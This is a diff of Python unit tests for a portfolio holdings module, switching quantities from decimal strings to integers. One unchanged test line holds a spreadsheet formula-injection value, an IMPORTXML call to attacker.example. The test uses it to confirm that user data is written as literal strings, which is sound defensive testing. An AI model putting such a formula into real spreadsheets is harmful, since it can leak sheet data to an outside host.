@@ -15,14 +15,15 @@ from app.modules.portfolio import holdings_manager, portfolio_manager
 def holding_input(**changes):
     return HoldingInput(**{
         "position_id": "position-one", "ticker": "NASDAQ:AAPL", "label": "Apple",
-        "currency": "USD", "quantity": "1.123456789012", "avg_cost": "150.125",
+        "currency": "USD", "quantity": "12", "avg_cost": "150.125",
         **changes,
     })
 
 
-def test_holding_input_keeps_decimal_quantity_and_optional_unknown_cost():
+def test_holding_input_uses_integer_quantity_and_optional_unknown_cost():
     body = holding_input(avg_cost=None)
-    assert body.quantity == Decimal("1.123456789012")
+    assert body.quantity == 12
+    assert isinstance(body.quantity, int)
     assert body.avg_cost is None
 
 
@@ -78,7 +79,7 @@ def test_sdk_writer_uses_literal_cells_for_user_data_and_only_server_generated_f
     assert cells["start"]["rowIndex"] == 1
     values = [cell["userEnteredValue"] for cell in cells["rows"][0]["values"]]
     assert values[1] == {"stringValue": '=IMPORTXML("https://attacker.example","//x")'}
-    assert values[4] == {"stringValue": "1.123456789012"}
+    assert values[4] == {"stringValue": "12"}
     assert values[5] == {"stringValue": "150.125"}
     assert values[7] == {"formulaValue": '=GOOGLEFINANCE("NASDAQ:AAPL","price")'}
     assert "tradetime" in values[8]["formulaValue"]
